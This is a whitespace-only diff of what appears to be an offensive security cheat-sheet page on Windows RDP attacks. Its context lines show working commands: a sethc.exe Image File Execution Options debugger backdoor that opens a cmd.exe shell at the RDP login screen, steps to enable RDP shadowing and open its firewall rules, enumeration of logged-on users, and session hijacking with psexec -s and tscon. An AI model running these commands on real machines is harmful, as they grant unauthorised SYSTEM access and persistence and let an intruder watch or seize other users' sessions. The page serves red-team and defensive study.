@@ -13,28 +13,27 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 ```
 
 ### sethc.exe
- 
+
 Hit F5 a bunch of times when you are at the RDP login screen.
 
 ```powershell
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
-
 ## RDP Shadowing
 
 RDP shadowing is a feature of Remote Desktop Protocol (RDP) that allows a remote user to view or control another user's active RDP session on a Windows computer. This feature is typically used for remote assistance, training, or collaboration purposes, allowing one user to observe or take control of another user's desktop, applications, and input devices as if they were physically present at the computer.
 
-
 **Requirements**
 
 * `TermService` must be running
+
     ```ps1
     sc.exe \\MYSERVER query TermService
     sc.exe \\MYSERVER start TermService
     ```
-* `SYSTEM` privilege or the account's password
 
+* `SYSTEM` privilege or the account's password
 
 **Enable RDP Shadowing**
 
@@ -64,7 +63,6 @@ $fwrule = Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirew
 $fwrule | Invoke-CimMethod -MethodName Enable
 ```
 
-
 **Enumerate active users**
 
 Query to enumerate active users on the machine.
@@ -74,7 +72,6 @@ quser.exe /SERVER:MYSERVER
 query.exe user /server:MYSERVER
 qwinsta.exe /server:MYSERVER
 ```
-
 
 **Use the shadow mode**
 
@@ -92,7 +89,6 @@ On older version you have to use  `tscon.exe` instead.
 psexec -s cmd
 cmd /k tscon 2 /dest:console
 ```
-
 
 ## References
 
